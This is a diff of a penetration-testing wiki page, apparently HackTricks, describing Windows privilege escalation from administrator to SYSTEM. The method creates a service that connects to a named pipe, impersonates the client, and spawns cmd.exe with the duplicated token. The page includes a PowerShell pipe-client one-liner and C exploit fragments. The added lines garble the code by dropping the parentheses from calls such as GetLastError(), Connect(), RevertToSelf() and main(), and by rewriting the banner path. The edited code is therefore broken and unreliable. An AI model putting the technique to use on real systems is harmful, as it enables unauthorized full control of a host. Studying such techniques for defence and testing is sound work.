@@ -1,6 +1,6 @@
 # From High Integrity to SYSTEM with Name Pipes
 
-{{#include ../../banners/hacktricks-training.md}}
+{{#include ../../banners/this collection-training.md}}
 
 This is the **administrator/SCM variant** of named-pipe impersonation: an elevated process creates a temporary service whose child connects as `SYSTEM`, then impersonates that client. If the starting context cannot create services but has `SeImpersonatePrivilege`, use a privileged-service coercion instead; see [Named Pipe Client Impersonation](named-pipe-client-impersonation.md) and [RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato](roguepotato-and-printspoofer.md). Creating the service requires access to the SCM and `SERVICE_START` access to the new service, while `CreateProcessWithTokenW` requires `SeImpersonatePrivilege`.<sup>[[2]](#references)[[3]](#references)</sup>
 
@@ -15,7 +15,7 @@ sc.exe query PiperSrv
 **Code flow:**
 
 1. Create the named-pipe server **before** starting the service. When waiting, treat `ConnectNamedPipe` returning `FALSE` with `ERROR_PIPE_CONNECTED` as success: it means the client won the race and connected between `CreateNamedPipe` and `ConnectNamedPipe`.<sup>[[4]](#references)</sup>
-2. Create and start a service that will connect to the created pipe and write something. The service code will execute this encoded PS code: `$pipe = new-object System.IO.Pipes.NamedPipeClientStream("piper"); $pipe.Connect(); $sw = new-object System.IO.StreamWriter($pipe); $sw.WriteLine("Go"); $sw.Dispose();`
+2. Create and start a service that will connect to the created pipe and write something. The service code will execute this encoded PS code: `$pipe = new-object System.IO.Pipes.NamedPipeClientStream("piper"); $pipe.Connect; $sw = new-object System.IO.StreamWriter($pipe); $sw.WriteLine("Go"); $sw.Dispose;`
 3. After the service connects and writes, call `ImpersonateNamedPipeClient`, open the resulting thread token, and duplicate it as a primary token.<sup>[[1]](#references)</sup>
 4. Use that primary token to spawn `cmd.exe`.<sup>[[2]](#references)</sup>
 
@@ -54,7 +54,7 @@ DWORD WINAPI ServiceGo(LPVOID lpParam) {
 		NULL, NULL, NULL, NULL, NULL);
 
 	if (scService == NULL) {
-		//printf("[!] CreateServiceA() failed: [%d]\n", GetLastError());
+		//printf("[!] CreateServiceA failed: [%d]\n", GetLastError);
 		return FALSE;
 	}
 
@@ -69,7 +69,7 @@ DWORD WINAPI ServiceGo(LPVOID lpParam) {
 	CloseServiceHandle(scManager);
 }
 
-int main() {
+int main {
 
 	LPCSTR sPipeName = "\\\\.\\pipe\\piper";
 	HANDLE hSrvPipe;
@@ -92,7 +92,7 @@ int main() {
 
 	// wait for the connection from the service
 	bPipeConn = ConnectNamedPipe(hSrvPipe, NULL);
-	if (!bPipeConn && GetLastError() == ERROR_PIPE_CONNECTED) {
+	if (!bPipeConn && GetLastError == ERROR_PIPE_CONNECTED) {
 		bPipeConn = TRUE; // Client connected between CreateNamedPipe and ConnectNamedPipe
 	}
 	if (bPipeConn) {
@@ -109,7 +109,7 @@ int main() {
 		WaitForSingleObject(th, INFINITE);
 
 		// get a handle to impersonated token
-		if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hImpToken)) {
+		if (!OpenThreadToken(GetCurrentThread, TOKEN_ALL_ACCESS, FALSE, &hImpToken)) {
 			return -2;
 		}
 
@@ -130,7 +130,7 @@ int main() {
 		}
 
 		// revert back to original security context
-		RevertToSelf();
+		RevertToSelf;
 
 	}
 
@@ -154,4 +154,4 @@ int main() {
 - [3] [Microsoft Learn — `CreateServiceA`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
 - [4] [Microsoft Learn — `ConnectNamedPipe`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe)
 - [5] [Microsoft Learn — `DuplicateTokenEx`](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex)
-{{#include ../../banners/hacktricks-training.md}}
+{{#include ../../banners/this collection-training.md}}
